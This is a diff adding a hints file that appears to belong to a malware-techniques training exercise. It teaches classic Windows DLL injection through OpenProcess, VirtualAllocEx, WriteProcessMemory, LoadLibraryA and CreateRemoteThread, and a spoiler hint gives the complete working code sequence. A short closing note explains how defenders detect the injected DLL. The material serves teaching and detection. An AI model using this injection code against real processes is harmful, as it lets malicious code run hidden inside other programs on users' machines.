@@ -1,0 +1,29 @@
+=== HINT 1 ===
+OpenProcess + VirtualAllocEx + WriteProcessMemory same as md05.
+Memory only needs PAGE_READWRITE (not executable) - we're writing a string.
+
+=== HINT 2: Resolve LoadLibraryA ===
+HMODULE k32 = GetModuleHandleA("kernel32.dll");
+LPTHREAD_START_ROUTINE loadlib = (LPTHREAD_START_ROUTINE)
+    GetProcAddress(k32, "LoadLibraryA");
+
+=== HINT 3: CreateRemoteThread ===
+thr = CreateRemoteThread(proc, NULL, 0,
+      loadlib,       // thread start = LoadLibraryA
+      remote_path,   // argument = remote string VA
+      0, NULL);
+
+=== HINT 4 (SPOILER) ===
+proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+remote_path = VirtualAllocEx(proc, NULL, path_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+WriteProcessMemory(proc, remote_path, dll_path, path_len, NULL);
+HMODULE k32 = GetModuleHandleA("kernel32.dll");
+LPTHREAD_START_ROUTINE loadlib = (LPTHREAD_START_ROUTINE)GetProcAddress(k32,"LoadLibraryA");
+thr = CreateRemoteThread(proc, NULL, 0, loadlib, remote_path, 0, NULL);
+WaitForSingleObject(thr, 5000);
+CloseHandle(thr); CloseHandle(proc);
+return 0;
+
+=== DETECTION NOTE ===
+LoadLibrary injection leaves a loaded DLL in the target - visible via
+Process Hacker / lsof. Defenders commonly hunt for unsigned DLLs in unusual paths.
